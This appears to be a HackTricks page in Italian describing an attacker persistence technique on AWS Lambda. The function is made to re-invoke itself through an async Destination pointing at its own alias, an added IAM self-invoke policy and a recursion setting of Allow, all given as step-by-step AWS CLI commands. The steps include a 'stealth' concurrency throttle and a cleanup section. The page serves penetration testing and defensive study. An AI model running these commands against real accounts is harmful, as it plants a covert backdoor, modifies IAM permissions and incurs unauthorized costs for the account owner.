# AWS - Lambda Async Self-Loop Persistence via Destinations + Recursion Allow

{{#include ../../../../banners/hacktricks-training.md}}

Abusa delle Destinations asincrone di Lambda insieme alla configurazione Recursion per far sì che una funzione si re-invii continuamente senza uno scheduler esterno (nessun EventBridge, cron, ecc.). Di default, Lambda interrompe i loop ricorsivi, ma impostare la recursion config su Allow li riabilita. Le Destinations consegnano lato servizio per le invoke async, quindi una singola seed invoke crea un canale stealthy, senza codice, tipo heartbeat/backdoor. Opzionalmente limita con reserved concurrency per mantenere basso il rumore.

Note
- Lambda non permette di configurare direttamente la funzione come sua stessa destination. Usa un function alias come destination e consenti all'execution role di invocare quell'alias.
- Permessi minimi: capacità di leggere/aggiornare l'event invoke config e recursion config della funzione target, pubblicare una versione e gestire un alias, e aggiornare la policy dell'execution role della funzione per permettere lambda:InvokeFunction sull'alias.

## Requirements
- Region: us-east-1
- Vars:
- REGION=us-east-1
- TARGET_FN=<target-lambda-name>

## Steps

1) Ottieni l'ARN della funzione e l'impostazione Recursion corrente
```
FN_ARN=$(aws lambda get-function --function-name "$TARGET_FN" --region $REGION --query Configuration.FunctionArn --output text)
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION || true
```
2) Pubblica una versione e crea/aggiorna un alias (usato come destinazione verso sé stesso)
```
VER=$(aws lambda publish-version --function-name "$TARGET_FN" --region $REGION --query Version --output text)
if ! aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION >/dev/null 2>&1; then
aws lambda create-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
else
aws lambda update-alias --function-name "$TARGET_FN" --name loop --function-version "$VER" --region $REGION
fi
ALIAS_ARN=$(aws lambda get-alias --function-name "$TARGET_FN" --name loop --region $REGION --query AliasArn --output text)
```
3) Consentire al ruolo di esecuzione della funzione di invocare l'alias (richiesto da Lambda Destinations→Lambda)
```
# Set this to the execution role name used by the target function
ROLE_NAME=<lambda-execution-role-name>
cat > /tmp/invoke-self-policy.json <<EOF
{
"Version": "2012-10-17",
"Statement": [
{
"Effect": "Allow",
"Action": "lambda:InvokeFunction",
"Resource": "${ALIAS_ARN}"
}
]
}
EOF
aws iam put-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --policy-document file:///tmp/invoke-self-policy.json --region $REGION
```
4) Configurare la destinazione asincrona sull'alias (se stesso tramite alias) e disabilitare i retry
```
aws lambda put-function-event-invoke-config \
--function-name "$TARGET_FN" \
--destination-config OnSuccess={Destination=$ALIAS_ARN} \
--maximum-retry-attempts 0 \
--region $REGION

# Verify
aws lambda get-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION --query DestinationConfig
```
5) Consentire loop ricorsivi
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Allow --region $REGION
aws lambda get-function-recursion-config --function-name "$TARGET_FN" --region $REGION
```
6) Avviare una singola invocazione asincrona
```
aws lambda invoke --function-name "$TARGET_FN" --invocation-type Event /tmp/seed.json --region $REGION >/dev/null
```
7) Osservare invocazioni continue (esempi)
```
# Recent logs (if the function logs each run)
aws logs filter-log-events --log-group-name "/aws/lambda/$TARGET_FN" --limit 20 --region $REGION --query events[].timestamp --output text
# or check CloudWatch Metrics for Invocations increasing
```
8) Stealth throttle opzionale
```
aws lambda put-function-concurrency --function-name "$TARGET_FN" --reserved-concurrent-executions 1 --region $REGION
```
## Pulizia
Interrompi il loop e rimuovi la persistenza.
```
aws lambda put-function-recursion-config --function-name "$TARGET_FN" --recursive-loop Terminate --region $REGION
aws lambda delete-function-event-invoke-config --function-name "$TARGET_FN" --region $REGION || true
aws lambda delete-function-concurrency --function-name "$TARGET_FN" --region $REGION || true
# Optional: delete alias and remove the inline policy when finished
aws lambda delete-alias --function-name "$TARGET_FN" --name loop --region $REGION || true
ROLE_NAME=<lambda-execution-role-name>
aws iam delete-role-policy --role-name "$ROLE_NAME" --policy-name allow-invoke-self --region $REGION || true
```
## Impatto
- Una singola async invoke fa sì che Lambda si reinvoci continuamente senza uno scheduler esterno, permettendo stealthy persistence/heartbeat. Reserved concurrency può limitare il rumore a una singola warm execution.
{{#include ../../../../banners/hacktricks-training.md}}
